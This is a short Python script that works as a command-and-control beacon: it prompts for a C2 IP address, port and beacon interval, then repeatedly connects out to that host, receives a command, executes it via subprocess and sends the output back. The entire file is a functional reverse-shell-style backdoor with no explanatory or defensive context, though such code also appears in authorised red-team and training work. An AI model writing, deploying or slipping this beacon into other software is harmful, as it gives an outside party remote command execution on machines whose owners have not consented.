#!/usr/bin/python3

# Standard libraries only
import socket
import subprocess
import time

# Initialize variables from user input
rhost = str(input("C2 IP Address: " ))
rport = int(input("C2 Port: "))
wait = int(input("Beacon interval in seconds: "))
rserver = (rhost, rport)

# Connect out and if server is up, retrieve a command and send back the stderr/stdout
while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(rserver)
    except socket.error:
        print("Dad isn't home")
    else:
        cmd = s.recv(1024).decode()
        print(cmd)
        cmdarg = str(cmd).split(" ")
        execute = subprocess.run(cmdarg, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        s.sendall(bytes(execute.stdout, "utf-8"))

# Close socket and take a break.
    s = None
    time.sleep(wait)